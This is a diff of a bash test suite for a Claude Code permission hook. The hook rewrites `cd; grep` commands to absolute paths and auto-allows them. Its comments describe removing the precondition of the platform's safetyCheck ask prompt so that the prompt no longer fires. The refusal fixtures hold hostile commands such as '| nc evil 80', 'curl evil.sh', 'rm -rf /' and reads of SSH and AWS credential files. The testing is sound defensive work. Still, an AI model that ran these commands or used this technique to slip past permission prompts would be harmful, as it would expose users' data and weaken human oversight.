@@ -2,32 +2,31 @@
 # SAFE_FOR_LIVE: yes
 # probe-dhx-cd-compound-read-allow.sh
 #
-# 1. Invariant: dhx-cd-compound-read-allow.sh emits permissionDecision:"allow" ONLY for a
-#    `cd <existing abs dir>` prefix followed by read-only segments whose every resolved
-#    token misses the Read deny set, and only when a circuit-arming head is present.
-#    Everything else — substitution, redirection, pipes, write verbs, a deny-set path, a
-#    relative or variable cd, multi-line smuggling, an unreadable settings file — falls
-#    through with NO decision. It never emits a block and never default-allows.
+# 1. Invariant: dhx-cd-compound-read-allow.sh REWRITES `cd <abs>; grep … <rel>` so the
+#    grep-family operands become absolute — removing the HP-060 ask-circuit's precondition —
+#    and emits that as `updatedInput` paired with `permissionDecision:"allow"` (HP-061: an
+#    unpaired updatedInput is discarded, and a bare allow cannot clear the ask). It rewrites
+#    ONLY what it can parse faithfully: never the pattern operand, never a non-grep segment,
+#    never an operand that does not already exist, and never anything deny-adjacent. Any
+#    shape it cannot fully rewrite produces NO output at all, restoring today's prompt.
 # 2. Backs: docs/decisions.md "dhx-cd-compound-read-allow" row (2026-09-03) + HP-060 + HP-061.
 # 3. Run: bash tests/probes/probe-dhx-cd-compound-read-allow.sh
 #
-# READ THIS BEFORE TRUSTING A GREEN RUN. Every assertion below is about what the hook
-# EMITS. Per HP-061 the platform then DISCARDS that emission for the one circuit the hook
-# targets: a hook `allow` loses to the `safetyCheck` ask, so 85/85 green does NOT mean the
-# measured permission prompt stops. This suite pins the hook's parser and its refusal
-# surface — both of which the `updatedInput` rewrite will reuse verbatim — not its efficacy.
-# The efficacy assertion cannot live here at all; it is a live control (see the
-# decisions.md row). A probe that cannot observe the thing it would need to observe should
-# say so rather than let its own green stand in for the claim.
+# The fidelity assertions in section 2 are the load-bearing ones. This hook MUTATES the
+# model's Bash commands, so a wrong rewrite is silently wrong output — strictly worse than
+# the permission prompt it removes. `cd /repo; grep -rn docs docs` is the canonical trap:
+# the PATTERN `docs` is also a real directory, and a naive rewriter prefixes it and changes
+# what is being searched for. That case is asserted explicitly.
 #
-# Read-only: fixture JSON piped to the hook subshell, plus greps over in-repo hook source
-# and the plugin manifest. Deny-set variants inject a fixture settings tree via
-# CLAUDE_CONFIG_DIR under mktemp (D-20 SAFE_FOR_LIVE convention). No writes outside TMP.
+# Read-only: fixture JSON piped to the hook subshell + greps over in-repo sources. Deny-set
+# and project-scope cells inject a fixture settings tree via CLAUDE_CONFIG_DIR under mktemp
+# (D-20 convention); the live settings file is only ever READ. No writes outside TMP.
 set -uo pipefail
 
 REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
 HOOK="$REPO/dhx/dhx-cd-compound-read-allow.sh"
 PLUGIN_HOOKS="$REPO/dhx-plugin/plugins/dhx/hooks/hooks.json"
+DISJOINT_PROBE="$REPO/tests/probes/probe-updatedinput-producer-disjointness.sh"
 LIVE_SETTINGS="$(readlink -f "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" 2>/dev/null || true)"
 
 pass=0; fail=0
@@ -36,185 +35,207 @@ bad() { echo "FAIL $1"; fail=$((fail+1)); }
 ck()  { if [ "$1" -eq 0 ]; then ok "$2"; else bad "$2"; fi; }
 
 TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT
-
-# A real directory to `cd` into: the hook requires the target to exist.
 D="$REPO"
 
-payload() { jq -n --arg c "$1" '{tool_name:"Bash",tool_input:{command:$c}}'; }
+payload() { jq -n --arg c "$1" '{tool_name:"Bash",tool_input:{command:$c,timeout:600000,description:"probe"}}'; }
 fire()    { payload "$1" | bash "$HOOK" 2>/dev/null; }
+newcmd()  { fire "$1" | jq -r '.hookSpecificOutput.updatedInput.command // empty' 2>/dev/null; }
 
-allows()  { fire "$1" | jq -e '.hookSpecificOutput.permissionDecision == "allow"' >/dev/null 2>&1; }
-silent()  { [ -z "$(fire "$1")" ]; }
+# r <command> <expected-rewritten-command> <label>
+r() {
+  local got; got=$(newcmd "$1")
+  if [ "$got" = "$2" ]; then ok "$3"; else bad "$3"$'\n'"       want: $2"$'\n'"       got:  ${got:-<silent>}"; fi
+}
+# s <command> <label> — no output at all
+s() {
+  local got; got=$(fire "$1")
+  if [ -z "$got" ]; then ok "$2"; else bad "$2 (emitted: $(printf '%s' "$got" | tr -d '\n' | cut -c1-160))"; fi
+}
 
-a() { if allows "$1"; then ok "$2"; else bad "$2"; fi; }
-s() { if silent "$1"; then ok "$2"; else bad "$2 (emitted: $(fire "$1" | tr -d '\n'))"; fi; }
+echo "--- 1. the measured defect shape is rewritten absolute ---"
+r "cd $D; grep -n -iE \"foo\" docs/backlog.md" \
+  "cd $D ; grep -n -iE \"foo\" $D/docs/backlog.md" \
+  "measured shape: relative operand -> absolute"
+r "cd $D && grep -n foo docs/backlog.md" \
+  "cd $D && grep -n foo $D/docs/backlog.md" \
+  "&& separator preserved as &&"
+r "cd $D || grep -n foo docs/backlog.md" \
+  "cd $D || grep -n foo $D/docs/backlog.md" \
+  "|| separator preserved as ||"
+r "cd $D; rg -n foo docs" \
+  "cd $D ; rg -n foo $D/docs" \
+  "rg with a directory operand"
+r "cd $D; grep -n foo docs/backlog.md docs/decisions.md" \
+  "cd $D ; grep -n foo $D/docs/backlog.md $D/docs/decisions.md" \
+  "multiple path operands all rewritten"
+r "cd $D; grep -n foo ./docs/backlog.md" \
+  "cd $D ; grep -n foo $D/docs/backlog.md" \
+  "leading ./ normalized away"
+r "cd $D; grep -n foo docs/../docs/backlog.md" \
+  "cd $D ; grep -n foo $D/docs/backlog.md" \
+  ".. normalized lexically"
 
-echo "--- 1. the measured defect shape allows ---"
-a "cd $D; grep -n -iE \"foo\" docs/backlog.md"        "measured shape: grep after cd; -> allow"
-a "cd $D && grep -n foo docs/backlog.md"              "&& separator -> allow"
-a "cd $D; rg -n foo docs/"                            "rg (arming head) -> allow"
-a "cd $D; git log --oneline -5"                       "git log (read-only subcommand) -> allow"
-a "cd $D; ls; grep -n foo docs/backlog.md"            "mixed compound: unlisted-but-safe companion + grep -> allow"
-a "cd $D; grep -n foo docs/backlog.md; wc -l docs/backlog.md" "three segments, all read-only -> allow"
+echo "--- 2. FIDELITY: what must NOT be rewritten (the silently-wrong-output class) ---"
+r "cd $D; grep -rn docs docs" \
+  "cd $D ; grep -rn docs $D/docs" \
+  "PATTERN that is also a real dir is NOT rewritten; only the operand is"
+r "cd $D; grep -rn tests tests" \
+  "cd $D ; grep -rn tests $D/tests" \
+  "second pattern/dir collision (tests) behaves identically"
+r "cd $D; grep -n \"a;b\" docs/backlog.md" \
+  "cd $D ; grep -n \"a;b\" $D/docs/backlog.md" \
+  "separator inside a quoted pattern survives the scanner"
+r "cd $D; grep -n 'x || y' docs/backlog.md" \
+  "cd $D ; grep -n 'x || y' $D/docs/backlog.md" \
+  "|| inside a single-quoted pattern is not a separator"
+r "cd $D; grep -n foo docs/backlog.md; wc -l docs/backlog.md" \
+  "cd $D ; grep -n foo $D/docs/backlog.md ; wc -l docs/backlog.md" \
+  "companion segment is re-emitted byte-identical (wc does not arm the circuit)"
+r "cd $D; grep -n foo /etc/hosts docs/backlog.md" \
+  "cd $D ; grep -n foo /etc/hosts $D/docs/backlog.md" \
+  "an already-absolute operand is left exactly as written"
+out=$(fire "cd $D; grep -n foo docs/backlog.md")
+printf '%s' "$out" | jq -e '.hookSpecificOutput.updatedInput.timeout == 600000' >/dev/null 2>&1
+ck $? "HP-041: original tool_input.timeout is re-emitted, not dropped"
+printf '%s' "$out" | jq -e '.hookSpecificOutput.updatedInput.description == "probe"' >/dev/null 2>&1
+ck $? "HP-041: original tool_input.description is re-emitted, not dropped"
+printf '%s' "$out" | jq -e '.hookSpecificOutput.permissionDecision == "allow"' >/dev/null 2>&1
+ck $? "HP-061: updatedInput is PAIRED with allow (unpaired is discarded by Ifo)"
 
-echo "--- 2. deny-set paths never allow ---"
-s "cd $D; grep x .env"                                "deny set: .env basename -> silent"
-s "cd $D; grep x .env.local"                          "deny set: .env.* glob -> silent"
-s "cd $D; grep x .secrets"                            "deny set: .secrets -> silent"
-s "cd $D; grep x ../.env"                             "deny set: ../ escapes into a denied basename -> silent"
-s "cd $D; grep x docs/../.env"                        "deny set: mid-path .. normalization -> silent"
-s "cd $D; grep x ~/.ssh/id_rsa"                       "deny set: ~/.ssh subtree -> silent"
-s "cd $D; grep x /home/dhx/.aws/credentials"          "deny set: absolute ~/.aws subtree -> silent"
-s "cd $D; grep -f .env docs/backlog.md"               "deny set: path carried by a FLAG operand -> silent"
-s "cd $D; grep --file=.env docs/backlog.md"           "deny set: path after = in a long flag -> silent"
-s "cd $D; cat .env"                                   "deny set + no arming head -> silent"
+echo "--- 3. grep grammar: refuse rather than guess ---"
+s "cd $D; grep -e foo docs/backlog.md"        "-e supplies the pattern -> refuse"
+s "cd $D; grep -f pat.txt docs/backlog.md"    "-f supplies a pattern FILE -> refuse"
+s "cd $D; grep --regexp=foo docs/backlog.md"  "--regexp= -> refuse"
+s "cd $D; grep --file=p docs/backlog.md"      "--file= -> refuse"
+s "cd $D; grep -A3 foo docs/backlog.md"       "-A carries an arg-consuming letter -> refuse"
+s "cd $D; grep -m 2 foo docs/backlog.md"      "-m consumes the next word -> refuse"
+s "cd $D; grep -C2 foo docs/backlog.md"       "-C bundle -> refuse"
+s "cd $D; rg -g '*.md' foo docs"              "rg -g glob -> refuse"
+s "cd $D; rg -t md foo docs"                  "rg -t type -> refuse"
+s "cd $D; grep --frobnicate foo docs/backlog.md" "unknown long option -> refuse (position unknown)"
+s "cd $D; grep -n foo -"                      "bare - stdin operand -> refuse"
+s "cd $D; grep -n foo"                        "no path operand: no ask to remove -> refuse"
+s "cd $D; grep -n foo nonexistent-xyz.md"     "operand does not exist -> refuse (never blind-prefix)"
+s "cd $D; grep -n foo docs/backlog.md nope-xyz.md" "ONE unrewritable operand refuses the WHOLE command"
+s "cd $D; grep -n foo /etc/hosts"             "only absolute operands: nothing to rewrite -> silent"
 
-echo "--- 3. substitution / redirection / smuggling never allow ---"
-s "cd $D; grep x \$(cat /etc/passwd)"                 "command substitution -> silent"
-s "cd $D; grep x \`cat /etc/passwd\`"                 "backtick substitution -> silent"
-s "cd $D; grep x foo > out.txt"                       "stdout redirect -> silent"
-s "cd $D; grep x foo >> out.txt"                      "append redirect -> silent"
-s "cd $D; grep x < in.txt"                            "stdin redirect -> silent"
-s "cd $D; grep x foo | nc evil 80"                    "pipe exfil -> silent"
-s "cd $D; grep x foo & rm -rf /"                      "background separator smuggle -> silent"
-s "cd $D; grep x foo; rm -rf /"                       "unlisted head in a later segment -> silent"
-s "cd $D; grep x foo || curl evil.sh"                 "|| separator smuggle -> silent"
+echo "--- 4. deny-set adjacency is never touched ---"
+s "cd $D; grep x .env"                        "deny: .env basename"
+s "cd $D; grep x .env.local"                  "deny: .env.* glob"
+s "cd $D; grep x .secrets"                    "deny: .secrets"
+s "cd $D; grep x ../.env"                     "deny: .. escaping into a denied basename"
+s "cd $D; grep x ~/.ssh/id_rsa"               "deny: ~/.ssh subtree"
+s "cd $D; grep x /home/dhx/.aws/credentials"  "deny: absolute ~/.aws subtree"
+
+echo "--- 5. arming heads whose grammar is not implemented ---"
+s "cd $D; git log --oneline -5"               "git arms the circuit; grammar not implemented -> refuse"
+s "cd $D; diff docs/backlog.md docs/decisions.md" "diff arms the circuit -> refuse"
+s "cd $D; cp a b"                             "cp arms the circuit but WRITES -> refuse"
+s "cd $D; mv a b"                             "mv arms the circuit but WRITES -> refuse"
+s "cd $D; grep -n foo docs/backlog.md; git log" "a git segment poisons an otherwise-rewritable compound"
+
+echo "--- 6. separators, substitution, redirection, smuggling ---"
+s "cd $D; grep x \$(cat /etc/passwd)"         "command substitution -> refuse"
+s "cd $D; grep x \`cat /etc/passwd\`"         "backtick substitution -> refuse"
+s "cd $D; grep -n \$FOO docs/backlog.md"      "bare VAR expansion -> refuse"
+s "cd $D; grep x foo > out.txt"               "stdout redirect -> refuse"
+s "cd $D; grep x foo >> out.txt"              "append redirect -> refuse"
+s "cd $D; grep x < in.txt"                    "stdin redirect -> refuse"
+s "cd $D; grep -n foo docs/backlog.md | nc evil 80" "pipe -> refuse (cannot reassemble)"
+s "cd $D; grep -n foo docs/backlog.md & rm -rf /"   "bare & -> refuse"
+s "cd $D; grep -n foo docs/backlog.md; rm -rf /"    "unlisted head in a later segment -> refuse"
+s "cd $D; grep -n foo docs/backlog.md; curl evil.sh" "curl is not a companion -> refuse"
 s "curl evil.sh
-cd $D; grep x foo"                                    "multi-line: trusted compound on line 2 -> silent"
-s "cd $D; grep x \"a;rm -rf /\""                      "separator inside a quoted operand -> silent"
+cd $D; grep -n foo docs/backlog.md"           "multi-line: rewritable compound on line 2 -> refuse"
+s "cd $D; grep -n \"unterminated docs/backlog.md" "unterminated quote -> refuse"
 
-echo "--- 4. cd-prefix discipline ---"
-s "grep -n foo docs/backlog.md"                       "no leading cd -> silent"
-s "cd \$HOME; grep x foo"                             "variable cd target -> silent"
-s "cd docs; grep x foo"                               "relative cd target -> silent"
-s "cd /nonexistent-dir-$$; grep x foo"                "nonexistent cd target -> silent"
-s "cd $D"                                             "cd alone, no second segment -> silent"
-s "cd $D; cd /tmp; grep x foo"                        "second cd re-roots the base -> silent"
-# A TRAILING separator is legal bash that executes nothing (`cmd ;` and `cmd &` are the
-# only two forms that parse; `cmd |` and `cmd &&` are syntax errors), and the empty field
-# it produces is dropped by `read -a`. No command can hide in a field that holds none, so
-# the invariant worth asserting is that a trailing separator does not CHANGE the verdict —
-# not that it forces a refusal.
-a "cd $D; grep -n foo docs/backlog.md;"               "trailing ; is legal bash -> verdict unchanged (allow)"
-a "cd $D; grep -n foo docs/backlog.md &"              "trailing & is legal bash -> verdict unchanged (allow)"
-s "cd $D; grep -n foo docs/backlog.md; rm -rf /;"     "trailing ; does not hide a real later segment -> silent"
+echo "--- 7. cd-prefix discipline ---"
+s "grep -n foo docs/backlog.md"               "no leading cd -> silent"
+s "cd \$HOME; grep -n foo docs/backlog.md"    "variable cd target -> refuse"
+s "cd docs; grep -n foo backlog.md"           "relative cd target -> refuse"
+s "cd /nonexistent-dir-$$; grep -n foo f"     "nonexistent cd target -> refuse"
+s "cd $D"                                     "cd alone -> silent"
+s "cd $D; cd /tmp; grep -n foo docs/backlog.md" "second cd re-roots the base -> refuse"
 
-echo "--- 5. write verbs and opaque interpreters never allow ---"
-s "cd $D; cp a b"                                     "cp (in CC's arming set, but WRITES) -> silent"
-s "cd $D; mv a b"                                     "mv (in CC's arming set, but WRITES) -> silent"
-s "cd $D; grep x foo; sed -i s/a/b/ f"                "sed -i in-place write -> silent"
-s "cd $D; grep x foo; tee out.txt"                    "tee -> silent"
-s "cd $D; grep x foo; python3 -c print(1)"            "python3 -c opaque -> silent"
-s "cd $D; grep x foo; node -e 1"                      "node -e opaque -> silent"
-s "cd $D; grep x foo; xargs rm"                       "xargs executes -> silent"
-s "cd $D; grep x foo; find . -delete"                 "find -delete -> silent"
-s "cd $D; grep x foo; find . -exec rm {} +"           "find -exec -> silent"
-s "cd $D; grep x foo; awk 'BEGIN{system(\"id\")}'"    "awk system() -> silent"
+echo "--- 8. companion gating still holds ---"
+s "cd $D; grep -n foo docs/backlog.md; sed -i s/a/b/ f" "sed -i writes -> refuse"
+s "cd $D; grep -n foo docs/backlog.md; tee out.txt"     "tee -> refuse"
+s "cd $D; grep -n foo docs/backlog.md; python3 -c x"    "python3 -c opaque -> refuse"
+s "cd $D; grep -n foo docs/backlog.md; xargs rm"        "xargs executes -> refuse"
+s "cd $D; grep -n foo docs/backlog.md; find . -delete"  "find -delete -> refuse"
+s "cd $D; grep -n foo docs/backlog.md; awk 'BEGIN{system(\"id\")}'" "awk system() -> refuse"
 
-echo "--- 6. git subcommand gating ---"
-a "cd $D; git diff --stat"                            "git diff -> allow"
-a "cd $D; git status --porcelain"                     "git status -> allow"
-s "cd $D; git push origin main"                       "git push -> silent"
-s "cd $D; git reset --hard"                           "git reset -> silent"
-s "cd $D; git add -A"                                 "git add -> silent"
-s "cd $D; git checkout -- ."                          "git checkout -> silent"
-s "cd $D; git commit -m x"                            "git commit -> silent"
-s "cd $D; git clean -fd"                              "git clean -> silent"
-s "cd $D; git branch -D main"                         "git branch (carries -D) -> silent"
-s "cd $D; git config --unset x"                       "git config (carries --unset) -> silent"
-s "cd $D; git -C /elsewhere log"                      "git -C re-roots the repo -> silent"
-
-echo "--- 7. arming-head requirement (hook speaks only to the measured circuit) ---"
-s "cd $D; ls"                                         "no arming head (ls only) -> silent"
-s "cd $D; cat docs/backlog.md"                        "no arming head (cat only) -> silent"
-s "cd $D; wc -l docs/backlog.md"                      "no arming head (wc only) -> silent"
-
-echo "--- 8. settings resolution ---"
-# Unreadable settings => the deny set is unknown => no allow.
+echo "--- 9. settings resolution ---"
 mkdir -p "$TMP/nocfg"
 out=$(payload "cd $D; grep -n foo docs/backlog.md" | CLAUDE_CONFIG_DIR="$TMP/nocfg" bash "$HOOK" 2>/dev/null)
-[ -z "$out" ]; ck $? "unreadable settings.json -> no allow (deny set unknown)"
+[ -z "$out" ]; ck $? "unreadable settings.json -> no rewrite (deny set unknown)"
 
-# A settings file whose Read deny list is EMPTY must still not widen the hook: the
-# hardcoded floor is applied ALWAYS, not merely as a fallback. This is the assertion that
-# a rewriter-dropped deny rule cannot silently widen auto-approval.
 mkdir -p "$TMP/emptycfg"
 printf '{"permissions":{"deny":[]}}' > "$TMP/emptycfg/settings.json"
 out=$(payload "cd $D; grep x .env" | CLAUDE_CONFIG_DIR="$TMP/emptycfg" bash "$HOOK" 2>/dev/null)
-[ -z "$out" ]; ck $? "empty deny list -> floor still refuses .env (rewriter cannot widen)"
+[ -z "$out" ]; ck $? "empty deny list -> floor still refuses .env (a rewriter cannot widen this hook)"
 out=$(payload "cd $D; grep -n foo docs/backlog.md" | CLAUDE_CONFIG_DIR="$TMP/emptycfg" bash "$HOOK" 2>/dev/null)
-printf '%s' "$out" | jq -e '.hookSpecificOutput.permissionDecision=="allow"' >/dev/null 2>&1
-ck $? "empty deny list -> a safe shape still allows (floor is not a blanket refusal)"
+printf '%s' "$out" | jq -e '.hookSpecificOutput.updatedInput.command' >/dev/null 2>&1
+ck $? "empty deny list -> a safe shape still rewrites (floor is not a blanket refusal)"
 
-# A project-scoped deny rule under the cd target is honored.
 mkdir -p "$TMP/proj/.claude"
 printf '{"permissions":{"deny":["Read(secret-notes.md)"]}}' > "$TMP/proj/.claude/settings.json"
-s "cd $TMP/proj; grep x secret-notes.md"              "project-scoped Read deny is honored"
-a "cd $TMP/proj; grep x ordinary.md"                  "project-scoped deny does not over-refuse"
+: > "$TMP/proj/secret-notes.md"; : > "$TMP/proj/ordinary.md"
+s "cd $TMP/proj; grep x secret-notes.md"      "project-scoped Read deny is honored"
+r "cd $TMP/proj; grep x ordinary.md" \
+  "cd $TMP/proj ; grep x $TMP/proj/ordinary.md" \
+  "project-scoped deny does not over-refuse"
 
-echo "--- 9. malformed / hostile input fails open to the prompt ---"
-out=$(printf 'not json' | bash "$HOOK" 2>/dev/null; true)
-printf '%s' "$out" | grep -q 'permissionDecision'; [ $? -ne 0 ]
-ck $? "malformed JSON -> no decision emitted"
-out=$(printf '' | bash "$HOOK" 2>/dev/null; true)
-[ -z "$out" ]; ck $? "empty stdin -> no decision emitted"
-out=$(printf '{"tool_input":{}}' | bash "$HOOK" 2>/dev/null; true)
-[ -z "$out" ]; ck $? "missing command field -> no decision emitted"
+echo "--- 10. malformed input fails open ---"
+for bad_in in 'not json' '' '{"tool_input":{}}' '{"tool_input":{"command":""}}'; do
+  out=$(printf '%s' "$bad_in" | bash "$HOOK" 2>/dev/null; true)
+  [ -z "$out" ]; ck $? "malformed/empty input -> no output (${bad_in:0:24})"
+done
 
-echo "--- 10. the hook never blocks and never emits updatedInput ---"
+echo "--- 11. no block arm, and exit-code discipline ---"
 payload "cd $D; grep x .env" | bash "$HOOK" >/dev/null 2>&1; rc=$?
-[ "$rc" -ne 2 ]; ck $? "refusal path exits non-2 (this hook has no block arm; rc=$rc)"
+[ "$rc" -ne 2 ]; ck $? "refusal path never exits 2 (this hook has no block arm; rc=$rc)"
 payload "cd $D; grep -n foo docs/backlog.md" | bash "$HOOK" >/dev/null 2>&1; rc=$?
-[ "$rc" -eq 0 ]; ck $? "allow path exits 0 (JSON is honored only on exit 0; rc=$rc)"
-! grep -qE '^[^#]*updatedInput' "$HOOK"
-ck $? "source never spells updatedInput outside a comment (stays out of the rewriter roster)"
+[ "$rc" -eq 0 ]; ck $? "rewrite path exits 0 (updatedInput is applied only on exit 0; rc=$rc)"
 ! grep -qE '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' "$HOOK"
 ck $? "source emits no deny decision"
 
-echo "--- 11. disjointness against the live Bash deny rules ---"
-# Behavioral, not head-comparison: a head-only check would false-fail on `git`, which is
-# allowlisted for read-only subcommands while `Bash(git push --force *)` is denied. Each
-# live Bash deny rule's command text is driven through the hook inside a cd-compound.
+echo "--- 12. disjointness against the live Bash deny rules ---"
 if [ -n "$LIVE_SETTINGS" ] && [ -r "$LIVE_SETTINGS" ]; then
-  bad_rules=""
-  n_rules=0
+  bad_rules=""; n_rules=0
   while IFS= read -r rule; do
     [ -n "$rule" ] || continue
     n_rules=$((n_rules + 1))
-    if allows "cd $D; $rule"; then bad_rules="$bad_rules
-      $rule"; fi
-    if allows "cd $D; grep -n foo docs/backlog.md; $rule"; then bad_rules="$bad_rules
-      (trailing) $rule"; fi
+    [ -n "$(newcmd "cd $D; $rule")" ] && bad_rules="$bad_rules
+      $rule"
+    [ -n "$(newcmd "cd $D; grep -n foo docs/backlog.md; $rule")" ] && bad_rules="$bad_rules
+      (trailing) $rule"
   done < <(jq -r '(.permissions.deny // []) | map(select(type=="string"))
                   | map(select(startswith("Bash(") and endswith(")"))) | map(.[5:-1]) | .[]' \
               "$LIVE_SETTINGS" 2>/dev/null)
   [ "$n_rules" -gt 0 ]; ck $? "live Bash deny corpus is non-empty ($n_rules rules — a zero would make the next assertion vacuous)"
   if [ -z "$bad_rules" ]; then
-    ok "no live Bash deny rule is auto-approved by this hook ($n_rules rules x 2 positions)"
+    ok "no live Bash deny rule draws a rewrite ($n_rules rules x 2 positions)"
   else
-    bad "a live Bash deny rule was auto-approved:$bad_rules"
+    bad "a live Bash deny rule drew a rewrite:$bad_rules"
   fi
 else
   bad "live settings unreadable — Bash deny disjointness UNVERIFIED (not a pass)"
 fi
 
-echo "--- 12. disjointness against the sibling PreToolUse:Bash deny-emitters ---"
-# dhx-worktree-bash-guard.sh denies on four write-verb shapes; each must be unreachable
-# through this hook, or an allow could race a deny on the same command (HP-041 records
-# that CC resolves competing same-matcher returns nondeterministically).
-s "cd $D; grep x f; sed -i.bak s/a/b/ f"              "worktree-guard shape: sed -i -> silent"
-s "cd $D; grep x f; dd if=/dev/zero of=f"             "worktree-guard shape: dd -> silent"
-s "cd $D; grep x f; install -m 755 a b"               "worktree-guard shape: install -> silent"
-s "cd $D; gh issue create --title x"                  "gh-issue-write shape: gh -> silent"
+echo "--- 13. disjointness against the sibling PreToolUse:Bash producers ---"
+s "cd $D; grep -n foo docs/backlog.md; sed -i.bak s/a/b/ f" "worktree-guard shape: sed -i"
+s "cd $D; grep -n foo docs/backlog.md; dd if=/dev/zero of=f" "worktree-guard shape: dd"
+s "cd $D; grep -n foo docs/backlog.md; install -m 755 a b"   "worktree-guard shape: install"
+s "cd $D; gh issue create --title x"                         "gh-issue-write shape: gh"
+s "cd $D; pytest tests/"                                     "pytest-cgroup-cap head"
+s "cd $D; grep -n foo docs/backlog.md; pytest"               "pytest in a later segment"
+s "cd $D; pip install six"                                   "pkg-install-filter head"
+s "cd $D; grep -n foo docs/backlog.md; npm install"          "npm in a later segment"
 
-echo "--- 13. wiring ---"
-grep -q '^# Patterns: HP-028, HP-049, HP-052, HP-060, HP-061' "$HOOK"
-ck $? "Patterns header declares HP-028, HP-049, HP-052, HP-060, HP-061"
-# The mechanism this hook emits is REFUTED (HP-061): a hook allow is discarded by the
-# very safetyCheck ask it targets. Until the updatedInput rewrite lands, the file must
-# carry its own INERT banner so no reader mistakes 84 green assertions for a working fix.
-grep -q 'STATUS 2026-09-03: INERT FOR ITS STATED PURPOSE' "$HOOK"
-ck $? "header carries the INERT status banner (HP-061 refutation is visible at the source)"
+echo "--- 14. wiring ---"
+grep -q '^# Patterns: HP-028, HP-041, HP-049, HP-052, HP-060, HP-061' "$HOOK"
+ck $? "Patterns header declares HP-028, HP-041, HP-049, HP-052, HP-060, HP-061"
 [ -x "$HOOK" ]; ck $? "hook is executable"
 grep -q 'dhx-cd-compound-read-allow.sh' "$PLUGIN_HOOKS"
 ck $? "registered in the plugin hooks.json Bash matcher"
@@ -223,7 +244,11 @@ ck $? "symlinked from ~/.claude/hooks/"
 [ "$(readlink -f "$HOME/.claude/hooks/dhx-cd-compound-read-allow.sh" 2>/dev/null)" = "$(readlink -f "$HOOK")" ]
 ck $? "symlink resolves to the in-repo source (single source of truth)"
 tail -1 "$HOOK" | grep -qE '^exit 0$'
-ck $? "final line is a bare exit 0 (allow is emitted before it, never as a default)"
+ck $? "final line is a bare exit 0"
+# Registering a rewriter without corpus rows hard-reds the disjointness probe's liveness
+# assertion. Sweeping is not exercising — this hook's own shapes must be written down there.
+grep -q 'cd-compound-read-allow' "$DISJOINT_PROBE"
+ck $? "this hook's shapes are enrolled in the updatedInput disjointness corpus"
 
 echo "---"
 echo "$pass passed, $fail failed"
